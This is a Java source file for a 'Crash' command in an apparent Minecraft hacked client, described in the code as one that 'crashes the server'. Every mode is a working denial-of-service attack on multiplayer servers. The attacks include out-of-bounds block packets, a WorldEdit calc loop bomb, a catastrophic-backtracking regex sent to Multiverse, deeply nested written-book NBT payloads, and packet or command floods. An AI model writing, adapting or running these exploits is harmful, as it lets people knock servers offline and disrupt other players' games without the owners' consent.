package me.saturn.delta.command.impl;

import it.unimi.dsi.fastutil.ints.Int2ObjectArrayMap;
import it.unimi.dsi.fastutil.ints.Int2ObjectMap;
import me.saturn.delta.Delta;
import me.saturn.delta.command.Command;
import me.saturn.delta.utils.ChatUtils;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtByte;
import net.minecraft.nbt.NbtList;
import net.minecraft.nbt.NbtString;
import net.minecraft.network.packet.c2s.play.BookUpdateC2SPacket;
import net.minecraft.network.packet.c2s.play.ClickSlotC2SPacket;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
import net.minecraft.network.packet.c2s.play.HandSwingC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerInteractBlockC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;
import net.minecraft.screen.slot.SlotActionType;
import net.minecraft.util.Hand;
import net.minecraft.util.hit.BlockHitResult;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;
import net.minecraft.util.math.Vec3d;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Optional;
import java.util.Random;
import java.util.function.Consumer;

public class Crash extends Command {
    enum CrashExec {
        LIST("List", (args) -> {
            for (CrashExec value : CrashExec.values()) {
                ChatUtils.message(value.getName());
            }
        }), CHUNKOOB("ChunkOOB", (args) -> {
            long sys = System.currentTimeMillis();
            Delta.c.player.networkHandler.sendPacket(new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, new BlockHitResult(new Vec3d(0.5, 0.5, 0.5), Direction.UP, new BlockPos(Double.POSITIVE_INFINITY, 100, Double.POSITIVE_INFINITY), true)));
            Delta.c.player.networkHandler.sendPacket(new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, new BlockHitResult(new Vec3d(0.5, 0.5, 0.5), Direction.UP, new BlockPos(Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY), true)));
            ChatUtils.message("Packets Sent - (" + (System.currentTimeMillis() - sys) + "ms)");
        }), WORLDEDIT("WorldEdit", (args) -> {
            Delta.c.player.sendChatMessage("//calc for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}");
        }), MULTIVERSE("Multiverse", (args) -> {
            Delta.c.player.sendChatMessage("/mv ^(.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.++)$^");
        }), CLICKBOOK("Clickbook", (args) -> {
            if (args.length < 2) {
                ChatUtils.message("Invalid syntax, need pages and power as arguments");
                return;
            }
            try {
                int pages = Integer.parseInt(args[0]);
                int pop = Integer.parseInt(args[1]);
                new Thread(() -> {
                    ChatUtils.message("Crashing - ClickBook");
                    long sy = System.currentTimeMillis();
                    ItemStack payload = new ItemStack(Items.WRITTEN_BOOK);
                    NbtList list = new NbtList();
                    String f = "{" + "extra:[{".repeat(Math.max(0, pages)) + "text:\"a\"}],".repeat(Math.max(0, pages)) + "text:\"a\"}";
                    list.add(NbtString.of(f));
                    payload.setSubNbt("author", NbtString.of(Delta.c.player.getGameProfile().getName()));
                    payload.setSubNbt("title", NbtString.of("Delta"));
                    payload.setSubNbt("pages", list);
                    payload.setSubNbt("resolved", NbtByte.of(true));
                    Int2ObjectMap<ItemStack> c = new Int2ObjectArrayMap<>();
                    c.apply(0);
                    c.apply(3);
                    c.apply(0);
                    c.apply(Integer.MAX_VALUE);
                    c.apply(Integer.MIN_VALUE);
                    for (int i = 0; i < pop; i++) {
                        Delta.c.player.networkHandler.sendPacket(new ClickSlotC2SPacket(Delta.c.player.currentScreenHandler.syncId, 0, Delta.c.player.getInventory().selectedSlot + 36, 1, SlotActionType.THROW, payload, c));
                    }
                    ChatUtils.message("Packets Sent - (" + (System.currentTimeMillis() - sy) + ")");
                }).start();
            } catch (Exception e) {
                ChatUtils.message("Invalid syntax, need pages and power as numbers");
            }
        }), WRITEBOOK("WriteBook", args -> {
            if (args.length == 0) {
                ChatUtils.message("Provide a Integer for power");
                return;
            }
            try {
                long syst = System.currentTimeMillis();
                List<String> crash = new ArrayList<>();
                int f = Integer.parseInt(args[0]);
                for (int i = 0; i < f; i++) {
                    crash.add(".");
                }
                Optional<String> title = Optional.empty();
                Delta.c.player.networkHandler.sendPacket(new BookUpdateC2SPacket(Delta.c.player.getInventory().selectedSlot, crash, title));
                ChatUtils.message("Packets Sent - (" + (System.currentTimeMillis() - syst) + ")");
            } catch (NumberFormatException e) {
                ChatUtils.message("Provide a valid Integer for power");
            }
        }), GIVEBOOK("Givebook",args -> {
            try {
                int pages = Integer.parseInt(args[0]);
                int pop = Integer.parseInt(args[1]);
                new Thread(() -> {
                    ChatUtils.message("Crashing - GiveBook");
                    long sy = System.currentTimeMillis();
                    ItemStack payload = new ItemStack(Items.WRITTEN_BOOK);
                    NbtList list = new NbtList();
                    StringBuilder f = new StringBuilder();
                    f.append("{");
                    f.append("extra:[{".repeat(Math.max(0, pages)));
                    f.append("text:\"+\"}],".repeat(Math.max(0, pages)));
                    f.append("text:\"+\"}");
                    for (int i = 0; i < pages / 16; i++) {
                        list.add(NbtString.of(f.toString()));
                    }
                    payload.setSubNbt("author", NbtString.of(Delta.c.player.getGameProfile().getName()));
                    payload.setSubNbt("title", NbtString.of("Delta"));
                    payload.setSubNbt("pages", list);
                    payload.setSubNbt("resolved", NbtByte.of(true));
                    for (int i = 0; i < pop; i++) {
                        Delta.c.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(100, payload));
                        try {
                            Thread.sleep(0);
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        }
                    }
                    ChatUtils.message("Packets Sent - (" + (System.currentTimeMillis() - sy) + ")");
                }).start();
            } catch (Exception e) {
                ChatUtils.message("use $crash givebook <pages> <power>");
            }
        }), SWINGARM("SwingArm", args -> {
            if (args.length == 0) {
                ChatUtils.message("Provide a Integer for power");
                return;
            }
            try {
                int power = Integer.parseInt(args[0]);
                new Thread(() -> {
                    long syst = System.currentTimeMillis();
                    for (int i = 0; i < power * 10; i++) {
                        Delta.c.player.networkHandler.sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));
                        try {
                            Thread.sleep(0);
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        }
                    }
                    ChatUtils.message("Packets Sent - (" + (System.currentTimeMillis() - syst) + ")");
                }).start();
            } catch (NumberFormatException e) {
                ChatUtils.message("Provide a valid Integer for power");
            }
        }), IGNORE("Ignore", args -> {
            ChatUtils.message("Crashing - LoverFella (/IGNORE)");
            if (args.length == 0) {
                ChatUtils.message("Provide a Integer for power");
                return;
            }
            try {
                int power = Integer.parseInt(args[0]);
                new Thread(() -> {
                    long syst = System.currentTimeMillis();
                    for (int i = 0; i < power * 10; i++) {
                        Delta.c.player.sendChatMessage("/ignore 55555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555");
                        try {
                            Thread.sleep(500);
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        }
                    }
                    ChatUtils.message("Packets Sent - (" + (System.currentTimeMillis() - syst) + ")");
                }).start();
            } catch (NumberFormatException e) {
                ChatUtils.message("Provide a valid Integer for power");
            }
        }), FADD("FAdd", args -> {
            if (args.length == 0) {
                ChatUtils.message("Provide a Integer for power");
                return;
            }
            try {
                int power = Integer.parseInt(args[0]);
                new Thread(() -> {
                    long syst = System.currentTimeMillis();
                    for (int i = 0; i < power * 10; i++) {
                        Delta.c.player.sendChatMessage("/f add 555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555");
                        try {
                            Thread.sleep(500);
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        }
                    }
                    ChatUtils.message("Packets Sent - (" + (System.currentTimeMillis() - syst) + ")");
                }).start();
            } catch (NumberFormatException e) {
                ChatUtils.message("Provide a valid Integer for power");
            }
        }), POPBOB("PopBob", args -> {
            ChatUtils.message("Crashing - Popbob");
            if (args.length == 0) {
                ChatUtils.message("Provide a Integer for power");
                return;
            }
            try {
                int power = Integer.parseInt(args[0]);
                new Thread(() -> {
                    long syst = System.currentTimeMillis();
                    Random r = new Random();
                    for (int j = 0; j < 100; j++) {
                        for (int i = 0; i < power; i++) {
                            Delta.c.player.networkHandler.sendPacket(new PlayerMoveC2SPacket.OnGroundOnly(r.nextBoolean()));
                            try {
                                Thread.sleep(0);
                            } catch (InterruptedException e) {
                                e.printStackTrace();
                            }
                        }
                        try {
                            Thread.sleep(200);
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        }
                    }
                    ChatUtils.message("Packets Sent - (" + (System.currentTimeMillis() - syst) + ")");
                }).start();
            } catch (NumberFormatException e) {
                ChatUtils.message("Provide a valid Integer for power");
            }
        });
        Consumer<String[]> r;
        String             n;
        CrashExec(String name, Consumer<String[]> run) {
            this.r = run;
            this.n = name;
        }

        public String getName() {
            return n;
        }

        public void execute(String[] args) {
            r.accept(args);
        }
    }
    
    public Crash() {
        super("Crash", "crashes the server", "crash");
    }

    @Override public void execute(String[] args) {
        if (args.length == 0) {
            ChatUtils.message("use $crash <mode> <arguments?> (or $crash list)");
            return;
        }

        String name = args[0];
        String[] argum = Arrays.copyOfRange(args,1,args.length);
        for (CrashExec value : CrashExec.values()) {
            if (value.getName().equalsIgnoreCase(name)) {
                value.execute(argum);
                return;
            }
        }
        ChatUtils.message("Crash not found. use $crash list to view all");
    }
}
